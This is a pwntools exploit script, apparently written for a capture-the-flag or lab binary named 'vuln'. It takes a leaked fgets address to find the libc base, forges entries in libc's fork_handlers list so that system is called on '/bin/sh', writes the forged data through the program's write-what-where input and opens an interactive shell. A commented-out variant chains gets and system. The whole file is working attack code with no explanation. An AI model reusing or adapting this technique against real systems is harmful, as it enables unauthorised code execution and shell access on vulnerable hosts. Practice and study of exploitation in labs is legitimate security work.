#!/usr/bin/python3
from pwn import *

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)

p = e.process()

fgets = int(p.recvline(), 16)
log.info(f"fgets: {hex(fgets)}")

libc.address = fgets - libc.sym.fgets
log.info(f"libc: {hex(libc.address)}")

def header(addr, size):
    return flat({
        0x00: size,
        0x10: addr
    })

def handler_array(*funcs):
    assert funcs
    data = bytearray(0x20*len(funcs) - 0x18)
    for i, func in zip(range(0, len(data), 0x20), funcs[::-1]):
        data[i:i+8] = p64(func)
    return data

def forge_split(addr, *funcs, rdi=None):
    array = handler_array(*funcs)
    if rdi is not None:
        size = rdi
        assert size >= len(funcs)
        addr = (addr - (size-len(funcs))*0x20) % (1<<64)
    else:
        size = len(funcs)
    return header(addr, size), array

def forge(addr, *funcs, rdi=None):
    hdr, arr = forge_split(addr+0x18, *funcs, rdi=rdi)
    return hdr + arr

addr = libc.sym.fork_handlers
extra_data = None

data = forge(addr, libc.sym.system, rdi=next(libc.search(b"/bin/sh\x00")))
assert b"\n" not in data

"""
data = forge(addr, libc.sym.gets, libc.sym.system, rdi=addr+0x200)
assert b"\n" not in data
extra_data = b"/bin/sh"
"""

#gdb.attach(p)
p.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)

if extra_data:
    p.sendline(extra_data)

p.interactive()
